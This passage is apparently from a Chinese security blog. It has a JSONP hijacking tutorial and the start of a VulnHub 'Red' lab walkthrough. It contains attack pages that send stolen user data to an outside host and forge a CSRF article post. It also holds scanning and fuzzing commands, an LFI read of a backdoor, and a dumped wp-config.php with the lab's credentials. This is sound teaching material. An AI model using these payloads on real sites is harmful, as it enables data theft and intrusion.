<span class=\"variable\">$callback</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"variable\">$callback</span>.<span class=\"string\">&#x27;(&#123;&quot;username&quot; : &quot;monkey111&quot;, &quot;password&quot; : &quot;123456&quot;&#125;);&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;No callback param.&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>请求后触发XSS，此时发现php默认的<code>Content-Type</code>为<code>text/html</code></p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822142338041.png\" alt=\"image-20230822142338041\"></p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822142423562.png\" alt=\"image-20230822142423562\"></p>\n<h3 id=\"其他Content-Type类型\"><a href=\"#其他Content-Type类型\" class=\"headerlink\" title=\"其他Content-Type类型\"></a>其他Content-Type类型</h3><p>经过测试后发现<code>application/json</code>、<code>text/json</code>、<code>application/javascript</code>、<code>text/javascript</code>等都不触发XSS</p>\n<blockquote>\n<p>jsonp劫持</p>\n</blockquote>\n<p>因为jsonp实现了跨域资源访问，如果获取的数据能够成为下一步操作的凭证，那么便可以引入jsonp劫持</p>\n<h3 id=\"demo1——窃取用户信息\"><a href=\"#demo1——窃取用户信息\" class=\"headerlink\" title=\"demo1——窃取用户信息\"></a>demo1——窃取用户信息</h3><p>设置模拟用户登录页面login.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"variable\">$name</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$pwd</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pwd&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$name</span>===<span class=\"string\">&#x27;admin&#x27;</span> &amp;&amp; <span class=\"variable\">$pwd</span> === <span class=\"string\">&#x27;admin&#x27;</span> || <span class=\"variable\">$name</span>===<span class=\"string\">&#x27;guest&#x27;</span> &amp;&amp; <span class=\"variable\">$pwd</span> === <span class=\"string\">&#x27;guest&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;logout&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;logout&#x27;</span>] === <span class=\"string\">&#x27;1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;http://127.0.0.1/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;http://127.0.0.1/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">   &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;title&gt;登录&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">   &lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">   &lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">         用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">         密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">         &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">   &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">   &lt;/html&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;欢迎您, &quot;</span>.<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>].<span class=\"string\">&quot;&lt;br data-tomark-pass&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>查询信息页面info.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"variable\">$callback</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] === <span class=\"string\">&#x27;admin&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$callback</span>.<span class=\"string\">&quot;(&#123;&#x27;id&#x27;:1,&#x27;name&#x27;:&#x27;Sentiment&#x27;&#125;)&quot;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">elseif</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] === <span class=\"string\">&#x27;guest&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$callback</span>.<span class=\"string\">&quot;(&#123;&#x27;id&#x27;:2,&#x27;name&#x27;:&#x27;guest&#x27;&#125;)&quot;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$callback</span>.<span class=\"string\">&quot;获取个人信息失败&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>当用户登录后，访问info.php可以查询到自己的信息，此时构造恶意html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>lol<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">jsonp_hack</span>(<span class=\"params\">v</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;JSONP hijacking&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">var</span> h = <span class=\"string\">&#x27;&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> v)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"keyword\">var</span> a = <span class=\"string\">&#x27;&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                a = key + <span class=\"string\">&#x27; : &#x27;</span> + v[key] + <span class=\"string\">&#x27; ,&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                h += a;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"title function_\">alert</span>(h);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            $.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;http://192.168.117.1/index.html?value=&#x27;</span>+h);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://192.168.117.1/info.php?callback=jsonp_hack&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>引导用户访问后成功被jsonp劫持</p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822150636562.png\" alt=\"image-20230822150636562\"></p>\n<h3 id=\"demo2——劫持token\"><a href=\"#demo2——劫持token\" class=\"headerlink\" title=\"demo2——劫持token\"></a>demo2——劫持token</h3><p>下面的案例模拟通过jsonp劫持窃取token来发表文章的情形。</p>\n<p>add_article.php，放到目标服务器(192.168.117.134)中，功能是发表文章，前提是token值成功校验通过：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;token&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$csrf_token</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;token&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$csrf_token</span> === <span class=\"string\">&#x27;jsonp_test&#x27;</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;文章发表成功~&#x27;</span>.<span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$title</span>.<span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;csrf token error&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;no token&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>token.php</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;callback&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$callback</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"variable\">$callback</span>.<span class=\"string\">&#x27;(&#123;&quot;username&quot; : &quot;moneky111&quot;, &quot;password&quot; : &quot;123456&quot;, &quot;token&quot; : &quot;jsonp_test&quot;&#125;);&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;No callback param.&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>attack.html(放在192.168.117.133上)</p>\n</blockquote>\n<p>攻击者用于诱使用户访问的文件，放在攻击者服务器中，用于访问目标jsonp端点获取token之后，再带上token值想目标服务器的add_article.php发起请求来发表文章：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;JSONP Hijacking&lt;/title&gt;</span><br><span class=\"line\">&lt;meta charset=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=<span class=\"string\">&quot;http://192.168.117.134/add_article.php&quot;</span> method=<span class=\"string\">&quot;POST&quot;</span> id=<span class=\"string\">&quot;csrfsend&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;hidden&quot;</span> name=<span class=\"string\">&quot;content&quot;</span> value=<span class=\"string\">&quot;Hacked by Sentiment!&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;hidden&quot;</span> name=<span class=\"string\">&quot;title&quot;</span> value=<span class=\"string\">&quot;Oops!&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;hidden&quot;</span> id=<span class=\"string\">&quot;token&quot;</span> name=<span class=\"string\">&quot;token&quot;</span> value=<span class=\"string\">&quot;&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exp</span>(<span class=\"params\">obj</span>)</span>&#123;</span><br><span class=\"line\">    console.<span class=\"title function_ invoke__\">log</span>(obj);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> token = obj[<span class=\"string\">&quot;token&quot;</span>];</span><br><span class=\"line\">    document.<span class=\"title function_ invoke__\">getElementById</span>(<span class=\"string\">&quot;token&quot;</span>).value = token;</span><br><span class=\"line\">    document.<span class=\"title function_ invoke__\">getElementById</span>(<span class=\"string\">&quot;csrfsend&quot;</span>).<span class=\"title function_ invoke__\">submit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">&quot;text/javascript&quot;</span> src=<span class=\"string\">&quot;http://192.168.117.134/token.php?callback=exp&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>192.168.117.133/attack.html</code>，会跳转到<a href=\"http://192.168.117.134/add_article.php%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE\">http://192.168.117.134/add_article.php进行访问</a></p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822153409590.png\" alt=\"image-20230822153409590\"></p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><ul>\n<li>若可行，则使用CORS替换JSONP实现跨域功能；</li>\n<li>应用CSRF防御措施来调用JSON文件：显示Referer、部署token等；</li>\n<li>严哥设置Content-Type及编码（Content-Type: application&#x2F;json; charset&#x3D;utf-8）</li>\n<li>把回调函数加入到白名单</li>\n</ul>\n","categories":["web安全学习"],"tags":["web","安全","SRC"]},{"title":"red","url":"/2023/06/08/red/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/red-1,753/\">https://www.vulnhub.com/entry/red-1,753/</a></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>使用<code>sudo arp-scan -I eth0 -l</code>获取主机IP地址</p>\n<p><img src=\"/images/red/image-20230608233224432.png\" alt=\"image-20230608233224432\"></p>\n<p>使用<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.8</code>获取端口信息</p>\n<p><img src=\"/images/red/image-20230608233402196.png\" alt=\"image-20230608233402196\"></p>\n<p>访问之后，点击链接发现会跳转一个域名，但是无法访问</p>\n<p><img src=\"/images/red/image-20230608233725065.png\" alt=\"image-20230608233725065\"></p>\n<p>我们要加入<code>hosts</code></p>\n<p><img src=\"/images/red/image-20230608233816452.png\" alt=\"image-20230608233816452\"></p>\n<p>然后发现了一些提示</p>\n<p><img src=\"/images/red/image-20230608233840749.png\" alt=\"image-20230608233840749\"></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Your site has been Hacked! You’ll never find the backdoor hahahah</span><br><span class=\"line\">你的网站被黑了!你永远找不到后门的，哈哈哈</span><br></pre></td></tr></table></figure>\n\n<p>有后门文件，这里使用<code>dirsearch</code>进行扫描</p>\n<blockquote>\n<p>dirsearch dir -w “&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;CommonBackdoors-PHP.fuzz.txt” -u “<a href=\"http://redrocks.win/\">http://redrocks.win/</a>“ -e “php”</p>\n</blockquote>\n<p><img src=\"/images/red/image-20230608234009524.png\" alt=\"image-20230608234009524\"></p>\n<p>发现显示的状态码是500，搜索一下这个文件的作用</p>\n<p><img src=\"/images/red/image-20230608234105043.png\" alt=\"image-20230608234105043\"></p>\n<p>可能是一个webshell，需要传参，使用fuzz字典进行爆破</p>\n<blockquote>\n<p>wfuzz -c -u “<a href=\"http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test\">http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test</a>“ -w “&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;web&#x2F;dic&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;burp-parameter-names.txt”</p>\n</blockquote>\n<p><img src=\"/images/red/image-20230608234426440.png\" alt=\"image-20230608234426440\"></p>\n<p>经过手工测试发现存在文件读取漏洞</p>\n<p><img src=\"/images/red/image-20230608234604233.png\" alt=\"image-20230608234604233\"></p>\n<h2 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h2><h3 id=\"查找后门\"><a href=\"#查找后门\" class=\"headerlink\" title=\"查找后门\"></a>查找后门</h3><p>使用<code>php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php</code>读取<code>NetworkFileManagerPHP.php</code>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;<span class=\"subst\">$file</span>&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">       <span class=\"keyword\">include</span>(<span class=\"string\">&quot;NetworkFileManagerPHP.php&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"comment\">/* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>解码注释：</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">That password alone won&#x27;t help you! Hashcat says rules are rules</span><br><span class=\"line\">单凭密码是帮不了你的!Hashcat说规则就是规则</span><br></pre></td></tr></table></figure>\n\n<p>hashcat、john登录、base64，查资料发现这里提示的是hashcat的base64规则为密码突变</p>\n<p>因为这里使用的WordPress，其配置文件在<code>wp-config.php</code>中，我们进行读取</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * The base configuration for WordPress</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * The wp-config.php creation script uses this file during the installation.</span></span><br><span class=\"line\"><span class=\"comment\"> * You don&#x27;t have to use the web site, you can copy this file to &quot;wp-config.php&quot;</span></span><br><span class=\"line\"><span class=\"comment\"> * and fill in the values.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * This file contains the following configurations:</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * * MySQL settings</span></span><br><span class=\"line\"><span class=\"comment\"> * * Secret keys</span></span><br><span class=\"line\"><span class=\"comment\"> * * Database table prefix</span></span><br><span class=\"line\"><span class=\"comment\"> * * ABSPATH</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@package</span> WordPress</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"comment\">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class=\"line\"><span class=\"comment\">/** The name of the database for WordPress */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_NAME&#x27;</span>, <span class=\"string\">&#x27;wordpress&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** MySQL database username */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_USER&#x27;</span>, <span class=\"string\">&#x27;john&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** MySQL database password */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_PASSWORD&#x27;</span>, <span class=\"string\">&#x27;R3v_m4lwh3r3_k1nG!!&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** MySQL hostname */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_HOST&#x27;</span>, <span class=\"string\">&#x27;localhost&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** Database Charset to use in creating database tables. */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_CHARSET&#x27;</span>, <span class=\"string\">&#x27;utf8&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;DB_COLLATE&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;FS_METHOD&#x27;</span>, <span class=\"string\">&#x27;direct&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;WP_SITEURL&#x27;</span>, <span class=\"string\">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;WP_HOME&#x27;</span>, <span class=\"string\">&#x27;http://redrocks.win&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**#@+</span></span><br><span class=\"line\"><span class=\"comment\"> * Authentication unique keys and salts.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Change these to different unique phrases! You can generate these using</span></span><br><span class=\"line\"><span class=\"comment\"> * the &#123;<span class=\"doctag\">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * You can change these at any point in time to invalidate all existing cookies.</span></span><br><span class=\"line\"><span class=\"comment\"> * This will force all users to have to log in again.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@since</span> 2.6.0</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;AUTH_KEY&#x27;</span>,         <span class=\"string\">&#x27;2uuBvc8SO5&#123;&gt;UwQ&lt;^5V5[UHBw%N&#125;-BwWqw|&gt;&lt;*HfBwJ( $&amp;%,(Zbg/jwFkRHf~v|&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class=\"string\">&#x27;ah&#125;&lt;I`52GL6C^@~x C9FpMq-)txgOmA&lt;~&#123;R5ktY/@.]dBF?keB3&#125;+Y^u!a54 Xc(&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class=\"string\">&#x27;[a!K&#125;D&lt;7-vB3Y&amp;x_&lt;3e]Wd+J]!o+A:U@QUZ-RU1]tO@/N&#125;b&#125;R@+/$+u*pJ|Z(xu-&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;NONCE_KEY&#x27;</span>,        <span class=\"string\">&#x27; g4|@~:h,K29D&#125;$FL-f/eujw(VT;8wa7xRWpVR: &gt;&#125;,]!Ez.48E:ok 8Ip~5_o+a&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;AUTH_SALT&#x27;</span>,        <span class=\"string\">&#x27;a;,O&lt;~vbpL+|@W+!Rs1o,T$r9(LwaXI =I7ZW$.Z[+BQ=B6QG7nr+w_bQ6B]5q4c&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class=\"string\">&#x27;GkU:% Lo&#125; 9&#125;w38i:%]=uq&amp;J6Z&amp;RR#v2vsB5a_ +.[us;6mE+|$x*+ D*Ke+:Nt:&#x27;</span>);</span><br><span 